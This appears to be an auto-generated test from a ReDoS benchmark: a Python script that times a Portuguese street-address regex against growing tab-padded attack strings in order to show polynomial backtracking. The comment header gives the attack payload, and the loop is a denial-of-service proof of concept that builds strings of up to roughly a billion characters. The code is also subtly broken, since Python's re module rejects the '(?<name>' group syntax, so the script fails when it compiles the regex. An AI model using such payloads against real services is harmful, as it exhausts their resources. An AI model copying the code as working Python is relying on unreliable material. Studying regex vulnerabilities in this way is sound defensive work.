# 7431
# ^(?<tipo>.{1,3})\s+(?<endereco>.+),\s+(?<numero>\w{1,10})\s*(?<complemento>.*)$
# POLYNOMIAL
# nums:4
# POLYNOMIAL AttackString:"1 "+"\t"*5000+"! _1_POA(i)"

import re
from time import perf_counter

regex = """^(?<tipo>.{1,3})\s+(?<endereco>.+),\s+(?<numero>\w{1,10})\s*(?<complemento>.*)$"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "1 " + "\t" * i * 10000 + "! _1_POA(i)"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *10000}: took {DURATION} seconds!")